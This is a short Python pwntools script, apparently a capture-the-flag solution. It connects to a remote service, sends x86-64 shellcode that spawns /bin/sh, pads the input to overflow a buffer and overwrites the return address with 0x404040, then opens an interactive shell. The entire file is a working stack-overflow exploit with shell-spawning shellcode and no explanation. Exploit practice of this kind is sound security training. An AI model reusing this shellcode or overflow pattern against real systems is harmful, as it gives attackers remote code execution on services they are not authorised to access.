from pwn import *

#p = process('./pwn')
p = remote('shadowchat.top', 8302)

#context.terminal = ['tmux', 'splitw', '-h']

#gdb.attach(p)
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
shellcode = shellcode.ljust(0x78, b'a') + p64(0x404040)
p.sendline(shellcode)

p.interactive()
